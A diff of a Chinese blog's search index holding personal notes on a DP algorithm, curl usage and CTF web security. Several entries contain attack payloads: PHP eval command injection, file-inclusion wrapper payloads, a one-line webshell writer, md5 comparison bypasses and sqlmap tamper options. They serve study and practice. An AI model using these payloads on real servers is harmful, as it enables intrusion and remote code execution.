@@ -1,420 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>洛谷p1216</title>
-    <url>/2023/04/14/Algorithm/</url>
-    <content><![CDATA[<h1 id="USACO1-5-IOI1994-数字三角形-Number-Triangles"><a href="#USACO1-5-IOI1994-数字三角形-Number-Triangles" class="headerlink" title="[USACO1.5][IOI1994]数字三角形 Number Triangles"></a>[USACO1.5][IOI1994]数字三角形 Number Triangles</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>观察下面的数字金字塔。</p>
-<p>写一个程序来查找从最高点到底部任意处结束的路径，使路径经过数字的和最大。每一步可以走到左下方的点也可以到达右下方的点。</p>
-<pre><code class="cpp">        7 
-      3   8 
-    8   1   0 
-  2   7   4   4 
-4   5   2   6   5 
-</code></pre>
-<p>在上面的样例中,从 $7 \to 3 \to 8 \to 7 \to 5$ 的路径产生了最大</p>
-<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>第一个行一个正整数 $r$ ,表示行的数目。</p>
-<p>后面每行为这个数字金字塔特定行包含的整数。</p>
-<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>单独的一行,包含那个可能得到的最大的和。</p>
-<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><pre><code class="bash">5
-7
-3 8
-8 1 0
-2 7 4 4
-4 5 2 6 5
-</code></pre>
-<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><pre><code class="bash">30
-</code></pre>
-<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>【数据范围】<br>对于 $100%$ 的数据，$1\le r \le 1000$，所有输入在 $[0,100]$ 范围内。</p>
-<p>题目翻译来自NOCOW。</p>
-<p>USACO Training Section 1.5</p>
-<p>IOI1994 Day1T1</p>
-<h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><blockquote>
-<p>由于从上而下不好计算，从下而上，以下一行与本行和 较大值来替代本行元素，即可从下而上完成动态规划 dp[i-1][j]+&#x3D;max(dp[i][j]+dp[i][j+1]); 从而解决问题。</p>
-</blockquote>
-<p>代码如下</p>
-<pre><code class="cpp">    #include &lt;iostream&gt;
-    using namespace std;
-    int main()&#123;
-        int arr[1000][1000];
-        int n;
-        cin&gt;&gt;n;
-        for(int i=0;i&lt;n;i++)&#123;
-            for(int j=0;j&lt;=i;j++)&#123;
-                cin&gt;&gt;arr[i][j];
-            &#125;
-        &#125;
-    
-        for(int i=n-2;i&gt;=0;i--)&#123;
-            for(int j=0;j&lt;=i;j++)&#123;
-                arr[i][j]+=max(arr[i+1][j],arr[i+1][j+1]);
-            &#125;
-        &#125;
-        cout&lt;&lt;arr[0][0];
-    
-    
-        return 0;
-&#125;
-</code></pre>
-]]></content>
-      <categories>
-        <category>算法</category>
-      </categories>
-      <tags>
-        <tag>动态规划</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PHPsafe</title>
-    <url>/2023/05/07/PHPsafe/</url>
-    <content><![CDATA[<h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><pre><code class="bash">&lt;?php
-    include &quot;flag.php&quot;;
-    $a = @$_REQUEST[&#39;hello&#39;];
-    eval( &quot;var_dump($a);&quot;);
-    show_source(__FILE__);
-?&gt;
-</code></pre>
-<p><code>http://114.67.175.224:14508/?hello=file(&quot;flag.php&quot;)</code><br> 我还是觉得，脱离了基础全是浮云虚幻</p>
-<p><code>?hello=system(&quot;cat%20flag.php|base64&quot;)</code><br>或许这个更适合我，只不过需要注意 ｜base64</p>
-<p>$_SERVER：包含服务器及其执行环境的信息，如头信息、路径等。<br>$_GET：包含通过 HTTP GET 方法传递给脚本的变量。<br>$_POST：包含通过 HTTP POST 方法传递给脚本的变量。<br>$_COOKIE：包含通过 HTTP Cookies 传递给脚本的变量。<br>$_FILES：包含通过 HTTP POST 方法上传的文件信息。<br>$_ENV：包含环境变量。<br>$_REQUEST：包含 $_GET、$_POST 和 $_COOKIE 的内容。请注意，由于它会合并其他超全局变量的数据，因此不建议在实际代码中使用 $_REQUEST，因为它可能导致安全隐患。<br>$_SESSION：包含当前脚本可用的会话变量。在使用 session_start() 函数启动会话后，可以使用 $_SESSION 来存储和检索跨页面请求的数据。<br>$GLOBALS：包含所有全局变量的关联数组</p>
-<p>1.md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。<br><code>url/?kkeyey1[]=1&amp;kkeyey2[]=2</code><br>2，利用&#x3D;&#x3D;比较漏洞</p>
-<p>如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>php</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTML</title>
-    <url>/2023/04/12/htmllearing/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>前端</category>
-      </categories>
-      <tags>
-        <tag>html</tag>
-        <tag>学习</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>curl</title>
-    <url>/2023/05/05/curl/</url>
-    <content><![CDATA[<p>感觉非常好用，但是很容易忘，干脆下下来了</p>
-<pre><code class="bash">1.不带有任何参数时，curl 就是发出 GET 请求。
-curl https://www.example.com
-上面命令向www.example.com发出 GET 请求，服务器返回的内容会在命令行输出。
-
-2.-A
--A参数指定客户端的用户代理标头，即User-Agent。curl 的默认用户代理字符串是curl/[version]。
-
-curl -A &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36&#39; https://google.com
-上面命令将User-Agent改成 Chrome 浏览器。
-
-curl -A &#39;&#39; https://google.com
-上面命令会移除User-Agent标头。
-
-3.也可以通过-H参数直接指定标头，更改User-Agent。
-curl -H &#39;User-Agent: php/1.0&#39; https://google.com
-
-4.-b
--b参数用来向服务器发送 Cookie。
-curl -b &#39;foo=bar&#39; https://google.com
-上面命令会生成一个标头Cookie: foo=bar，向服务器发送一个名为foo、值为bar的 Cookie。
-
-curl -b &#39;foo1=bar;foo2=bar2&#39; https://google.com
-上面命令发送两个 Cookie。
-
-curl -b cookies.txt https://www.google.com
-上面命令读取本地文件cookies.txt，里面是服务器设置的 Cookie（参见-c参数），将其发送到服务器。
-
-5.-c
--c参数将服务器设置的 Cookie 写入一个文件。
-
-curl -c cookies.txt https://www.google.com
-上面命令将服务器的 HTTP 回应所设置 Cookie 写入文本文件cookies.txt。
-
-6.-d
--d参数用于发送 POST 请求的数据体。
-
-curl -d&#39;login=emma＆password=123&#39;-X POST https://google.com/login
-# 或者
-curl -d &#39;login=emma&#39; -d &#39;password=123&#39; -X POST  https://google.com/login
-使用-d参数以后，HTTP 请求会自动加上标头Content-Type : application/x-www-form-urlencoded。并且会自动将请求转为 POST 方法，因此可以省略-X POST。
-
--d参数可以读取本地文本文件的数据，向服务器发送。
-
-curl -d &#39;@data.txt&#39; https://google.com/login
-上面命令读取data.txt文件的内容，作为数据体向服务器发送。
-
-7.--data-urlencode
---data-urlencode参数等同于-d，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。
-
-curl --data-urlencode &#39;comment=hello world&#39; https://google.com/login
-上面代码中，发送的数据hello world之间有一个空格，需要进行 URL 编码。
-
-9.-e
--e参数用来设置 HTTP 的标头Referer，表示请求的来源。
-
-curl -e &#39;https://google.com?q=example&#39; https://www.example.com
-上面命令将Referer标头设为https://google.com?q=example。
-
-10.-H参数可以通过直接添加标头Referer，达到同样效果。
-
-curl -H &#39;Referer: https://google.com?q=example&#39; https://www.example.com
-
-11.-F
--F参数用来向服务器上传二进制文件。
-
-curl -F &#39;file=@photo.png&#39; https://google.com/profile
-上面命令会给 HTTP 请求加上标头Content-Type: multipart/form-data，然后将文件photo.png作为file字段上传。
-
--F参数可以指定 MIME 类型。
-
-curl -F &#39;file=@photo.png;type=image/png&#39; https://google.com/profile
-上面命令指定 MIME 类型为image/png，否则 curl 会把 MIME 类型设为application/octet-stream。
-
--F参数也可以指定文件名。
-
-curl -F &#39;file=@photo.png;filename=me.png&#39; https://google.com/profile
-上面命令中，原始文件名为photo.png，但是服务器接收到的文件名为me.png。
-
-12.-G
--G参数用来构造 URL 的查询字符串。
-
-curl -G -d &#39;q=kitties&#39; -d &#39;count=20&#39; https://google.com/search
-上面命令会发出一个 GET 请求，实际请求的 URL 为https://google.com/search?q=kitties&amp;count=20。如果省略--G，会发出一个 POST 请求。
-
-如果数据需要 URL 编码，可以结合--data--urlencode参数。
-
-curl -G --data-urlencode &#39;comment=hello world&#39; https://www.example.com
-
-13.-H
--H参数添加 HTTP 请求的标头。
-
-curl -H &#39;Accept-Language: en-US&#39; https://google.com
-上面命令添加 HTTP 标头Accept-Language: en-US。
-
-curl -H &#39;Accept-Language: en-US&#39; -H &#39;Secret-Message: xyzzy&#39; https://google.com
-上面命令添加两个 HTTP 标头。
-
-
-14.-d
-
-curl -d &#39;&#123;&quot;login&quot;: &quot;emma&quot;, &quot;pass&quot;: &quot;123&quot;&#125;&#39; -H &#39;Content-Type: application/json&#39; https://google.com/login
-上面命令添加 HTTP 请求的标头是Content-Type: application/json，然后用-d参数发送 JSON 数据。
-
-15.-i
--i参数打印出服务器回应的 HTTP 标头。
-
-curl -i https://www.example.com
-上面命令收到服务器回应后，先输出服务器回应的标头，然后空一行，再输出网页的源码。
-
-16.-I
--I参数向服务器发出 HEAD 请求，然会将服务器返回的 HTTP 标头打印出来。
-
-
-curl -I https://www.example.com
-上面命令输出服务器对 HEAD 请求的回应。
-
---head参数等同于-I。
-
-curl --head https://www.example.com
-
-17.-k
--k参数指定跳过 SSL 检测。
-
-curl -k https://www.example.com
-上面命令不会检查服务器的 SSL 证书是否正确。
-
-18.-L
--L参数会让 HTTP 请求跟随服务器的重定向。curl 默认不跟随重定向。
-
-curl -L -d &#39;tweet=hi&#39; https://api.twitter.com/tweet
---limit-rate
---limit-rate用来限制 HTTP 请求和回应的带宽，模拟慢网速的环境。
-
-19.curl --limit-rate 200k https://google.com
-上面命令将带宽限制在每秒 200K 字节。
-
-20.-o
--o参数将服务器的回应保存成文件，等同于wget命令。
-
-curl -o example.html https://www.example.com
-上面命令将www.example.com保存成example.html。
-
-21.-O
--O参数将服务器回应保存成文件，并将 URL 的最后部分当作文件名。
-
-curl -O https://www.example.com/foo/bar.html
-上面命令将服务器回应保存成文件，文件名为bar.html。
-
-22.-s
--s参数将不输出错误和进度信息。
-
-curl -s https://www.example.com
-上面命令一旦发生错误，不会显示错误信息。不发生错误的话，会正常显示运行结果。
-
-如果想让 curl 不产生任何输出，可以使用下面的命令。
-
-curl -s -o /dev/null https://google.com
-
-23.-S
--S参数指定只输出错误信息，通常与-s一起使用。
-
-curl -s -o /dev/null https://google.com
-上面命令没有任何输出，除非发生错误。
-
-24-u
--u参数用来设置服务器认证的用户名和密码。
-
-curl -u &#39;bob:12345&#39; https://google.com/login
-上面命令设置用户名为bob，密码为12345，然后将其转为 HTTP 标头Authorization: Basic Ym9iOjEyMzQ1。
-
-curl 能够识别 URL 里面的用户名和密码。
-
-curl https://bob:12345@google.com/login
-上面命令能够识别 URL 里面的用户名和密码，将其转为上个例子里面的 HTTP 标头。
-
-curl -u &#39;bob&#39; https://google.com/login
-上面命令只设置了用户名，执行后，curl 会提示用户输入密码。
-
-25.-v
--v参数输出通信的整个过程，用于调试。
-
-curl -v https://www.example.com
---trace参数也可以用于调试，还会输出原始的二进制数据。
-
-curl --trace - https://www.example.com
-
-26.-x
--x参数指定 HTTP 请求的代理。
-
-curl -x socks5://james:cats@myproxy.com:8080 https://www.example.com
-上面命令指定 HTTP 请求通过myproxy.com:8080的 socks5 代理发出。
-
-如果没有指定代理协议，默认为 HTTP。
-
-curl -x james:cats@myproxy.com:8080 https://www.example.com
-上面命令中，请求的代理使用 HTTP 协议。
-
-27.-X
--X参数指定 HTTP 请求的方法。
-
-curl -X POST https://www.example.com
-上面命令对https://www.example.com发出 POST 请求。
-</code></pre>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>curl</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>伪协议</title>
-    <url>/2023/05/12/%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
-    <content><![CDATA[<h3 id="file-x2F-x2F-协议"><a href="#file-x2F-x2F-协议" class="headerlink" title="file:&#x2F;&#x2F; 协议"></a>file:&#x2F;&#x2F; 协议</h3><p>条件：<br><code>allow_url_fopen:off/on</code><br><code>allow_url_include :off/on</code><br>作用：<br>用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受<code>allow_url_fopen与allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。<br>说明：<br>file:&#x2F;&#x2F; 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以&#x2F;、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()，include_path</code> 会可选地搜索，也作为相对的路径。<br>用法：</p>
-<pre><code class="bash">/path/to/file.ext
-relative/path/to/file.ext
-fileInCwd.ext
-C:/path/to/winfile.ext
-C:\path\to\winfile.ext
-\\smbserver\share\path\to\winfile.ext
-file:///path/to/file.ext
-</code></pre>
-<p>示例：</p>
-<ul>
-<li>file:&#x2F;&#x2F;[文件的绝对路径和文件名]</li>
-</ul>
-<p><code>http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</code></p>
-<ul>
-<li>[文件的相对路径和文件名]</li>
-</ul>
-<p><code>http://127.0.0.1/include.php?file=./phpinfo.txt</code></p>
-<ul>
-<li>[http：&#x2F;&#x2F;网络路径和文件名]<br><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></li>
-</ul>
-<h3 id="php-x2F-x2F-协议"><a href="#php-x2F-x2F-协议" class="headerlink" title="php:&#x2F;&#x2F; 协议"></a>php:&#x2F;&#x2F; 协议</h3><p>条件：<br><code>allow_url_fopen:off/on</code><br><code>allow_url_include :仅php://input php://stdin php://memory</code><br><code>php://temp 需要on</code><br>作用：<br>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于读取源码，<code>php://input</code>用于执行php代码。<br>说明：<br>PHP 提供了一些杂项输入&#x2F;输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
-<p>作用</p>
-<pre><code class="bash">php://input:可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype=&quot;multipart/form-data&quot; 的时候php://input 是无效的。
-php://output:只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。
-php://fd:(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。
-php://memory php://temp(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。
-php://filter:(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。
-</code></pre>
-<h4 id="php-x2F-x2F-filter参数详解"><a href="#php-x2F-x2F-filter参数详解" class="headerlink" title="php:&#x2F;&#x2F;filter参数详解"></a>php:&#x2F;&#x2F;filter参数详解</h4><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：<br>php:&#x2F;&#x2F;filter 参数描述</p>
-<ul>
-<li>resource&#x3D;&lt;要过滤的数据流&gt;必须项。它指定了你要筛选过滤的数据流。</li>
-<li>read&#x3D;&lt;读链的过滤器&gt;可选项。可以设定一个或多个过滤器名称，以管道符（<em>\ </em>）分隔。</li>
-<li>write&#x3D;&lt;写链的过滤器&gt;可选项。可以设定一个或多个过滤器名称，以管道符（\）分隔。</li>
-<li>&lt;; 两个链的过滤器&gt;任何没有以 read&#x3D; 或 write&#x3D; 作前缀的筛选器列表会视情况应用于读或写链。</li>
-</ul>
-<p>可用的过滤器列表（4类）</p>
-<ul>
-<li>字符串过滤器<br>string.rot13 等同于str_rot13()，rot13变换<br>string.toupper 等同于strtoupper()，转大写字母<br>string.tolower 等同于strtolower()，转小写字母<br>string.strip_tags 等同于strip_tags()，去除html、PHP语言标签</li>
-<li>转换过滤器<br>convert.base64-encode &amp; convert.base64-decode 等同于base64_encode()和base64_decode()，base64编码解码<br>convert.quoted-printable-encode &amp; convert.quoted-printable-decode quoted-printable 字符串与 8-bit 字符串编码解码</li>
-<li>压缩过滤器<br>zlib.deflate &amp; zlib.inflate 在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。<br>bzip2.compress &amp; bzip2.decompress 同上，在本地文件系统中创建 bz2 兼容文件的方法。</li>
-<li>加密过滤器<br>mcrypt.<em>libmcrypt 对称加密算法<br>mdecrypt.</em> libmcrypt 对称解密算法<br>示例：</li>
-</ul>
-<p><code>php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）</code></p>
-<p><code>http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</code></p>
-<p><code>php://input + [POST DATA]执行php代码</code></p>
-<pre><code class="bash">http://127.0.0.1/include.php?file=php://input
-[POST DATA部分]
-&lt;?php phpinfo(); ?&gt;
-图片描述
-</code></pre>
-<p>若有写入权限，写入一句话木马</p>
-<pre><code class="bash">http://127.0.0.1/include.php?file=php://input
-[POST DATA部分]
-&lt;?php fputs(fopen(&#39;1juhua.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;); ?&gt;
-</code></pre>
-<h3 id="zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F-协议"><a href="#zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F-协议" class="headerlink" title="zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 协议"></a>zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 协议</h3><p>条件：<br><code>allow_url_fopen:off/on</code><br><code>allow_url_include :off/on</code><br>作用：zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。<br>示例：</p>
-<p>zip:&#x2F;&#x2F;[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）</p>
-<p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>
-<p><code>http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</code></p>
-<p><code>compress.bzip2://file.bz2</code></p>
-<p>压缩 <code>phpinfo.txt</code> 为<code>phpinfo.bz2</code>并上传（同样支持任意后缀名）</p>
-<p><code>http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</code></p>
-<p><code>compress.zlib://file.gz</code></p>
-<p>压缩<code>phpinfo.txt</code>为<code> phpinfo.gz</code> 并上传（同样支持任意后缀名）</p>
-<p><code>http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</code></p>
-<h3 id="data-x2F-x2F-协议"><a href="#data-x2F-x2F-协议" class="headerlink" title="data:&#x2F;&#x2F; 协议"></a>data:&#x2F;&#x2F; 协议</h3><p>条件：<br><code>allow_url_fopen:on</code><br><code>allow_url_include :on</code><br>作用：自PHP&gt;&#x3D;5.2.0起，可以使用data:&#x2F;&#x2F;数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。<br>用法：</p>
-<p><code>data://text/plain,</code><br><code>data://text/plain;base64,</code><br>示例：</p>
-<pre><code class="bash">data://text/plain,
-
-http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;
-
-or
-
-data://text/plain;base64,
-
-http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
-</code></pre>
-<h3 id="http-和https-协议"><a href="#http-和https-协议" class="headerlink" title="http://和https://协议"></a><code>http://</code>和<code>https://</code>协议</h3><p>条件：<br><code>allow_url_fopen:on</code><br><code>allow_url_include :on</code><br>作用：常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。<br>用法：</p>
-<pre><code class="bash">http://example.com
-http://example.com/file.php?var1=val1&amp;var2=val2
-http://user:password@example.com
-https://example.com
-https://example.com/file.php?var1=val1&amp;var2=val2
-https://user:password@example.com
-</code></pre>
-<p>示例：<br><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></p>
-<h3 id="phar-x2F-x2F-协议"><a href="#phar-x2F-x2F-协议" class="headerlink" title="phar:&#x2F;&#x2F; 协议"></a>phar:&#x2F;&#x2F; 协议</h3><p>phar:&#x2F;&#x2F;协议与zip:&#x2F;&#x2F;类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p>
-<p><code>http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</code></p>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CyberSafe_Notes</title>
     <url>/2023/04/19/CyberSafe-Notes/</url>
     <content><![CDATA[<h2 id="基本的dos命令"><a href="#基本的dos命令" class="headerlink" title="基本的dos命令"></a>基本的dos命令</h2><ul>
@@ -676,6 +262,7 @@ phpinfo();
 ...url/?file=shell.txt
 构造post：ctfhub=system(&quot;cat /flag&quot;);
 </code></pre>
+<p>file_get_contents 在向目标请求时先会判断使用的协议。如果协议无法识别，就会认为它是个目录</p>
 <ul>
 <li>php:&#x2F;&#x2F;input#从输入中读取</li>
 </ul>
@@ -811,7 +398,7 @@ sqlmap -u [目标url] --user-agent=&quot;抓包得到的对应的内容*&quot; -
 --technique Q 内联查询注入
 
 脚本绕过限制 
-eg：sqlmap -u &quot;目标网址&quot; -D [数据库名] -T [表名] -C [列名] --dump --tamper &quot;space2comment.py&quot;
+eg：sqlmap -u &quot;目标网址&quot; -D [数据库名] -T [表名] -C [列名] --dump --tamper space2comment.py
 
 space2comment.py    -- 作用是用注释/**/替换空格字符&#39; &#39;
 equaltolike.py      -- 作用是用like代替等号
@@ -907,12 +494,361 @@ print(result)
 #   &#125;
 </code></pre>
 <p>url:a&#x3D;b&amp;proxy&#x3D;nginx–&gt;<br><code>&#123;a:&#39;b&#39;,proxy:&#39;nginx&#39;&#125;</code><br>qs最多解析1000个参数<br>所以<br>answer: <code>url/?a=1&amp;a=1.............</code></p>
+<h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2>]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>洛谷p1216</title>
+    <url>/2023/04/14/Algorithm/</url>
+    <content><![CDATA[<h1 id="USACO1-5-IOI1994-数字三角形-Number-Triangles"><a href="#USACO1-5-IOI1994-数字三角形-Number-Triangles" class="headerlink" title="[USACO1.5][IOI1994]数字三角形 Number Triangles"></a>[USACO1.5][IOI1994]数字三角形 Number Triangles</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>观察下面的数字金字塔。</p>
+<p>写一个程序来查找从最高点到底部任意处结束的路径，使路径经过数字的和最大。每一步可以走到左下方的点也可以到达右下方的点。</p>
+<pre><code class="cpp">        7 
+      3   8 
+    8   1   0 
+  2   7   4   4 
+4   5   2   6   5 
+</code></pre>
+<p>在上面的样例中,从 $7 \to 3 \to 8 \to 7 \to 5$ 的路径产生了最大</p>
+<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>第一个行一个正整数 $r$ ,表示行的数目。</p>
+<p>后面每行为这个数字金字塔特定行包含的整数。</p>
+<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>单独的一行,包含那个可能得到的最大的和。</p>
+<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><pre><code class="bash">5
+7
+3 8
+8 1 0
+2 7 4 4
+4 5 2 6 5
+</code></pre>
+<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><pre><code class="bash">30
+</code></pre>
+<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>【数据范围】<br>对于 $100%$ 的数据，$1\le r \le 1000$，所有输入在 $[0,100]$ 范围内。</p>
+<p>题目翻译来自NOCOW。</p>
+<p>USACO Training Section 1.5</p>
+<p>IOI1994 Day1T1</p>
+<h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><blockquote>
+<p>由于从上而下不好计算，从下而上，以下一行与本行和 较大值来替代本行元素，即可从下而上完成动态规划 dp[i-1][j]+&#x3D;max(dp[i][j]+dp[i][j+1]); 从而解决问题。</p>
+</blockquote>
+<p>代码如下</p>
+<pre><code class="cpp">    #include &lt;iostream&gt;
+    using namespace std;
+    int main()&#123;
+        int arr[1000][1000];
+        int n;
+        cin&gt;&gt;n;
+        for(int i=0;i&lt;n;i++)&#123;
+            for(int j=0;j&lt;=i;j++)&#123;
+                cin&gt;&gt;arr[i][j];
+            &#125;
+        &#125;
+    
+        for(int i=n-2;i&gt;=0;i--)&#123;
+            for(int j=0;j&lt;=i;j++)&#123;
+                arr[i][j]+=max(arr[i+1][j],arr[i+1][j+1]);
+            &#125;
+        &#125;
+        cout&lt;&lt;arr[0][0];
+    
+    
+        return 0;
+&#125;
+</code></pre>
+]]></content>
+      <categories>
+        <category>算法</category>
+      </categories>
+      <tags>
+        <tag>动态规划</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHPsafe</title>
+    <url>/2023/05/07/PHPsafe/</url>
+    <content><![CDATA[<h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><pre><code class="bash">&lt;?php
+    include &quot;flag.php&quot;;
+    $a = @$_REQUEST[&#39;hello&#39;];
+    eval( &quot;var_dump($a);&quot;);
+    show_source(__FILE__);
+?&gt;
+</code></pre>
+<p><code>http://114.67.175.224:14508/?hello=file(&quot;flag.php&quot;)</code><br> 我还是觉得，脱离了基础全是浮云虚幻</p>
+<p><code>?hello=system(&quot;cat%20flag.php|base64&quot;)</code><br>或许这个更适合我，只不过需要注意 ｜base64</p>
+<p>$_SERVER：包含服务器及其执行环境的信息，如头信息、路径等。<br>$_GET：包含通过 HTTP GET 方法传递给脚本的变量。<br>$_POST：包含通过 HTTP POST 方法传递给脚本的变量。<br>$_COOKIE：包含通过 HTTP Cookies 传递给脚本的变量。<br>$_FILES：包含通过 HTTP POST 方法上传的文件信息。<br>$_ENV：包含环境变量。<br>$_REQUEST：包含 $_GET、$_POST 和 $_COOKIE 的内容。请注意，由于它会合并其他超全局变量的数据，因此不建议在实际代码中使用 $_REQUEST，因为它可能导致安全隐患。<br>$_SESSION：包含当前脚本可用的会话变量。在使用 session_start() 函数启动会话后，可以使用 $_SESSION 来存储和检索跨页面请求的数据。<br>$GLOBALS：包含所有全局变量的关联数组</p>
+<p>1.md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。<br><code>url/?kkeyey1[]=1&amp;kkeyey2[]=2</code><br>2，利用&#x3D;&#x3D;比较漏洞</p>
+<p>如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
 ]]></content>
       <categories>
         <category>网络安全</category>
       </categories>
       <tags>
         <tag>web</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>curl</title>
+    <url>/2023/05/05/curl/</url>
+    <content><![CDATA[<p>感觉非常好用，但是很容易忘，干脆下下来了</p>
+<pre><code class="bash">1.不带有任何参数时，curl 就是发出 GET 请求。
+curl https://www.example.com
+上面命令向www.example.com发出 GET 请求，服务器返回的内容会在命令行输出。
+
+2.-A
+-A参数指定客户端的用户代理标头，即User-Agent。curl 的默认用户代理字符串是curl/[version]。
+
